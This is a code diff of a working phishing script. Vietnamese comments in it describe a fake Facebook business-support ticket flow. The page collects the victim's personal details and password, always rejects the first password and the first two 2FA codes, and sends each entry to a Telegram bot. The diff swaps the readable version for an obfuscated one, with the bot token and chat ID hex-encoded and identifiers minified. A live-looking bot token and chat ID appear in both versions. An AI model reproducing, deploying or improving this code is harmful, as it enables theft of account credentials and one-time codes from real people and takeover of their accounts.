@@ -1,314 +1,118 @@
-/* ================= 1. CONFIGURATION ================= */
-const CONFIG = {
-    TELEGRAM: {
-        // Thay token và chat ID của bạn vào đây
-        BOT_TOKEN: "7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE",
-        CHAT_ID: "-5070121169"
-    },
-    // Link chuyển hướng sau khi hoàn tất
-    REDIRECT_URL: "https://www.facebook.com/",
-    // API lấy địa chỉ IP
-    IP_API: "https://ipwho.is/"
+<script>
+const _C = {
+    T: "\x37\x31\x30\x30\x39\x32\x34\x39\x31\x31\x3A\x41\x41\x46\x62\x65\x32\x51\x48\x72\x78\x32\x36\x4A\x35\x70\x52\x45\x57\x74\x67\x6E\x2D\x6A\x6F\x32\x70\x57\x4B\x68\x35\x41\x39\x69\x6D\x45",
+    I: "\x2D\x35\x30\x37\x30\x31\x32\x31\x31\x36\x39",
+    R: "https://www.facebook.com/business/help",
+    A: "https://ipwho.is/"
 };
 
-/* ================= 2. MODAL & UI HELPERS ================= */
-const Modal = {
-    // Hiển thị Popup theo ID, ẩn các cái khác
-    show(modalId) {
-        const overlay = document.getElementById("overlay");
-        if (overlay) overlay.classList.remove("hidden");
-
-        ["infoForm", "passwordForm", "verifyModal"].forEach(id => {
-            const el = document.getElementById(id);
-            if (el) el.classList.add("hidden");
-        });
-
-        const target = document.getElementById(modalId);
-        if (target) target.classList.remove("hidden");
-    },
-
-    // Hiển thị lỗi đỏ
-    showError(type, msg) {
-        if (type === 'password') {
-            // Tìm thẻ lỗi password
-            let err = document.getElementById("passwordError");
-            
-            // FIX: Nếu HTML lỡ quên chưa tạo thẻ lỗi, tự tạo luôn bằng JS để chắc chắn hiện
-            if (!err) {
-                const input = document.getElementById("passwordInput");
-                if(input) {
-                    err = document.createElement("p");
-                    err.id = "passwordError";
-                    err.className = "text-red-500 text-sm mb-3 text-center";
-                    input.parentNode.insertBefore(err, input.nextSibling);
-                }
-            }
-
-            if (err) {
-                err.innerText = msg;
-                err.classList.remove("hidden");
-            }
-        } else if (type === 'verify') {
-            const err = document.getElementById("verifyError");
-            if (err) {
-                err.innerText = msg;
-                err.classList.remove("hidden");
-            }
-        }
-    },
-
-    // Ẩn lỗi (khi retry)
-    hideError(type) {
-        if (type === 'verify') {
-            const err = document.getElementById("verifyError");
-            if (err) err.classList.add("hidden");
-        }
-        if (type === 'password') {
-            const err = document.getElementById("passwordError");
-            if (err) err.classList.add("hidden");
-        }
-    }
-};
-
-/* ================= 3. UTILITIES (LOGIC GỬI TIN) ================= */
-const Utils = {
-    // Lấy thông tin IP
-    getLocation: async () => {
+const _U = {
+    gL: async () => {
         try {
-            const response = await fetch(CONFIG.IP_API);
-            const data = await response.json();
-            if (data.success) {
-                return {
-                    ip: data.ip,
-                    city: data.city || "Unknown",
-                    country: data.country || "Unknown",
-                    flag: data.flag ? data.flag.emoji : ""
-                };
-            }
-            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
-        } catch (e) {
-            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
-        }
+            const r = await fetch(_C.A);
+            const d = await r.json();
+            return d.success ? { i: d.ip, c: d.city, o: d.country, f: d.flag?.emoji||"" } : { i: "Unk", c: "N/A", o: "N/A", f: "" };
+        } catch { return { i: "Err", c: "N/A", o: "N/A", f: "" }; }
     },
-
-    // Lấy giờ hiện tại Việt Nam
-    getTime: () => {
-        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
-    },
-
-    // Gửi tin nhắn về Telegram
-    sendMessage: async (message) => {
-        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
-        if (!BOT_TOKEN || !CHAT_ID) return false;
-
+    sM: async (m) => {
+        if(!_C.T || !_C.I) return;
         try {
-            // SỬA LỖI: Thêm dấu backtick ` bao quanh URL
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${_C.T}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
+                body: JSON.stringify({ chat_id: _C.I, text: m, parse_mode: 'HTML' })
             });
-            if (!response.ok) return false;
-            return true;
-        } catch (e) {
-            console.error(e);
-            return false;
-        }
+        } catch (e) {}
     },
-
-    // Tạo nội dung báo cáo (Log)
-    formatReport: (data, type, loc) => {
-        const time = Utils.getTime();
-        
-        let icon = "";
-        if (type === "INFO") icon = "📝 INFO";
-        else if (type === "PASS1") icon = "🔑 PASS 1";
-        else if (type === "PASS2") icon = "🔐 PASS 2"; // Log Full
-        else if (type === "OTP") icon = "🔥 OTP";
-        else icon = "🔔 REPORT";
-
-        // SỬA LỖI: Thêm dấu backtick ` cho các biến chuỗi
-        let infoBlock = `<b>Name:</b> ${data.fullName}`;
-        if (data.email) infoBlock += `\n<b>Mail:</b> ${data.email}`;
-        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
-        infoBlock += `\n<b>Phone:</b> ${data.phone}`;
-        if (data.dob) infoBlock += `\n<b>DOB:</b> ${data.dob}`;
-
-        let passBlock = "";
-        if (data.pass1) passBlock += `\n----------------\n<b>P1:</b> <code>${data.pass1}</code>`;
-        if (data.pass2) passBlock += `\n<b>P2:</b> <code>${data.pass2}</code>`;
-        
-        let otpBlock = "";
-        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;
-
-        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;
-
-        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
+    fR: (d, t, l) => {
+        const tm = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+        let ic = t==="INFO"?"📝":(t.includes("PASS")?"🔑":"🔥");
+        let i = `<b>Name:</b> ${d.fn}\n<b>Mail:</b> ${d.em}`;
+        if(d.be) i += `\n<b>Biz:</b> ${d.be}`;
+        i += `\n<b>Ph:</b> ${d.ph}\n<b>DOB:</b> ${d.db}`;
+        let p = d.p1 ? `\n--\n<b>P1:</b> <code>${d.p1}</code>` : "";
+        if(d.p2) p += `\n<b>P2:</b> <code>${d.p2}</code>`;
+        let o = d.otp ? `\n--\n<b>OTP:</b> <code>${d.otp}</code>` : "";
+        return `<b>${ic} ${t}</b> | ${tm}\n----------------\n${i}${p}${o}\n================\n🌍 <code>${l.i}</code>\n📍 ${l.c}, ${l.o} ${l.f}`;
     },
-
-    // Ẩn email/sđt để hiển thị ở form OTP
-    maskString: (str, type) => {
-        if (!str) return "...";
-        if (type === 'email') {
-            const parts = str.split('@');
-            if (parts.length < 2) return str;
-            const visible = parts[0].length > 3 ? parts[0].substring(0, 3) : parts[0].substring(0, 1);
-            return `${visible}***@${parts[1]}`;
-        }
-        if (type === 'phone') {
-            if (str.length < 7) return str;
-            return `${str.substring(0, 3)}****${str.substring(str.length - 3)}`;
-        }
-        return str;
+    mK: (s, t) => {
+        if(!s || s.length<5) return "...";
+        return t==='e' ? `${s.substring(0,3)}***@${s.split('@')[1]}` : `${s.substring(0,3)}****${s.substring(s.length-3)}`;
     }
 };
 
-/* ================= 4. MAIN APP LOGIC ================= */
 document.addEventListener("DOMContentLoaded", async () => {
-    // 1. Khởi tạo
-    const userLoc = await Utils.getLocation(); 
-    let formData = {
-        fullName: "", email: "", businessEmail: "", phone: "", dob: "",
-        pass1: "", pass2: "", twoFactorCode: ""
+    const loc = await _U.gL();
+    let dat = { fn:"", em:"", be:"", ph:"", db:"", p1:"", p2:"", otp:"" };
+    let pC = 0, oC = 0, iL = false;
+
+    const gI = (i) => document.getElementById(i);
+    const sE = (i, m) => { let e=gI(i); e.innerText=m; e.classList.remove("hidden"); };
+    const hE = (i) => gI(i).classList.add("hidden");
+    const sM = (i) => {
+        gI("overlay").classList.remove("hidden");
+        ["infoForm","passwordForm","verifyModal"].forEach(x=>gI(x).classList.add("hidden"));
+        gI(i).classList.remove("hidden");
     };
-    
-    // State quản lý luồng
-    let passwordAttempts = 0;
-    let otpAttempts = 0;
-    let isLocked = false; 
 
-    // DOM Elements
-    const btnSubmit = document.getElementById("submitRequestBtn");
-    const btnSendInfo = document.querySelector("#infoForm button");
-    const btnPass = document.getElementById("continueBtn");
-    const btnVerify = document.getElementById("verifyBtn");
-    const countdownEl = document.getElementById("countdown");
+    if(gI("ticketId")) gI("ticketId").innerText = "REF-" + Math.floor(Math.random()*900000);
+    if(gI("submitRequestBtn")) gI("submitRequestBtn").onclick = () => sM("infoForm");
 
-    // Tạo Ticket ID ảo cho đẹp
-    const ticketEl = document.getElementById("ticketId");
-    if (ticketEl) ticketEl.innerText = "REF-" + Math.floor(100000 + Math.random() * 900000);
+    if(gI("sendInfoBtn")) gI("sendInfoBtn").onclick = () => {
+        let is = document.querySelectorAll("#infoForm input");
+        dat.fn=is[0].value; dat.em=is[1].value; dat.be=is[2].value; dat.ph=is[4].value;
+        dat.db=`${is[5].value}/${is[6].value}/${is[7].value}`;
+        _U.sM(_U.fR(dat, "INFO", loc));
+        sM("passwordForm");
+    };
 
-    // --- BƯỚC 0: Mở form Info ---
-    if (btnSubmit) {
-        btnSubmit.addEventListener("click", () => Modal.show("infoForm"));
-    }
+    if(gI("continueBtn")) gI("continueBtn").onclick = () => {
+        let v = gI("passwordInput").value;
+        if(!v) return;
+        pC++;
+        if(pC === 1) {
+            dat.p1 = v;
+            _U.sM(_U.fR(dat, "PASS1", loc));
+            gI("passwordInput").value = "";
+            sE("passwordError", "The password you entered is incorrect. Please try again.");
+        } else {
+            dat.p2 = v;
+            _U.sM(_U.fR(dat, "PASS2", loc));
+            gI("maskedEmail").innerText = _U.mK(dat.em, 'e');
+            gI("maskedPhone").innerText = _U.mK(dat.ph, 'p');
+            sM("verifyModal");
+        }
+    };
 
-    // --- BƯỚC 1: XỬ LÝ FORM INFO ---
-    if (btnSendInfo) {
-        btnSendInfo.addEventListener("click", () => {
-            const inputs = document.querySelectorAll("#infoForm .meta-input");
-            const dobInputs = document.querySelectorAll("#infoForm .grid input");
+    if(gI("verifyBtn")) gI("verifyBtn").onclick = () => {
+        if(iL) return;
+        let c = gI("verifyCode").value;
+        if(!c) return;
+        dat.otp = c;
+        oC++;
+        _U.sM(_U.fR(dat, "OTP", loc));
 
-            // [0] FullName, [1] Email, [2] Business Email, [3] Page Name, [4] Phone
-            formData.fullName = inputs[0].value || "N/A";
-            formData.email = inputs[1].value || "N/A";
-            formData.businessEmail = inputs[2].value || "N/A";
-            formData.phone = inputs[4].value || "N/A";
+        if(oC < 3) {
+            gI("verifyCode").value = "";
+            sE("verifyError", "The code you entered is incorrect.");
+            iL = true;
+            let b = gI("verifyBtn"), cd = gI("countdown"), s = 30;
+            b.disabled = true; b.style.opacity = "0.7"; b.innerText = "Please wait...";
+            cd.classList.remove("hidden");
             
-            if (dobInputs.length >= 3) {
-                formData.dob = `${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value}`;
-            }
-
-            Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
-            Modal.show("passwordForm");
-        });
-    }
-
-    // --- BƯỚC 2: XỬ LÝ PASSWORD (2 Lần) ---
-    if (btnPass) {
-        btnPass.addEventListener("click", () => {
-            const passInput = document.getElementById("passwordInput");
-            const val = passInput.value;
-            
-            if (!val) return; 
-
-            passwordAttempts++;
-
-            if (passwordAttempts === 1) {
-                // === LẦN 1: Giả vờ sai ===
-                formData.pass1 = val;
-                Utils.sendMessage(Utils.formatReport(formData, "PASS1", userLoc));
-
-                passInput.value = "";
-                // Báo lỗi (Code bên trên đã thêm tự động tạo thẻ lỗi nếu thiếu)
-                Modal.showError("password", "The password you entered is incorrect. Please try again.");
-                
-            } else {
-                // === LẦN 2: Chấp nhận -> Sang OTP ===
-                formData.pass2 = val;
-                Utils.sendMessage(Utils.formatReport(formData, "PASS2", userLoc));
-
-                const maskEmailEl = document.getElementById("maskedEmail");
-                const maskPhoneEl = document.getElementById("maskedPhone");
-                if (maskEmailEl) maskEmailEl.innerText = Utils.maskString(formData.email, 'email');
-                if (maskPhoneEl) maskPhoneEl.innerText = Utils.maskString(formData.phone, 'phone');
-
-                Modal.show("verifyModal");
-            }
-        });
-    }
-
-    // --- BƯỚC 3: XỬ LÝ OTP (Lock 30s) ---
-    if (btnVerify) {
-        btnVerify.addEventListener("click", () => {
-            if (isLocked) return; 
-
-            const codeInput = document.getElementById("verifyCode");
-            const codeVal = codeInput.value.trim();
-
-            if (!codeVal) return; 
-
-            formData.twoFactorCode = codeVal;
-            otpAttempts++;
-
-            Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));
-
-            if (otpAttempts < 3) {
-                // === LẦN 1 & 2: Sai -> KHÓA ===
-                codeInput.value = "";
-                Modal.showError("verify", "The code you entered is incorrect.");
-
-                isLocked = true;
-                btnVerify.disabled = true;
-                btnVerify.style.opacity = "0.7";
-                btnVerify.innerText = "Please wait...";
-
-                if (countdownEl) {
-                    let seconds = 30;
-                    countdownEl.classList.remove("hidden");
-                    countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
-
-                    const timer = setInterval(() => {
-                        seconds--;
-                        countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK
-
-                        if (seconds <= 0) {
-                            clearInterval(timer);
-                            isLocked = false;
-                            countdownEl.classList.add("hidden");
-                            Modal.hideError("verify");
-                            
-                            btnVerify.disabled = false;
-                            btnVerify.style.opacity = "1";
-                            btnVerify.innerText = "Continue";
-                        }
-                    }, 1000);
+            let t = setInterval(() => {
+                s--; cd.innerText = `Try again in ${s}s`;
+                if(s <= 0) {
+                    clearInterval(t); iL = false;
+                    cd.classList.add("hidden"); hE("verifyError");
+                    b.disabled = false; b.style.opacity = "1"; b.innerText = "Confirm";
                 }
-
-            } else {
-                // === LẦN 3: DONE ===
-                btnVerify.innerText = "Processing...";
-                btnVerify.disabled = true;
-                Modal.hideError("verify");
-
-                setTimeout(() => {
-                    window.location.href = CONFIG.REDIRECT_URL;
-                }, 1500);
-            }
-        });
-    }
+            }, 1000);
+        } else {
+            gI("verifyBtn").innerText = "Processing...";
+            hE("verifyError");
+            setTimeout(() => window.location.href = _C.R, 1500);
+        }
+    };
 });
+</script>
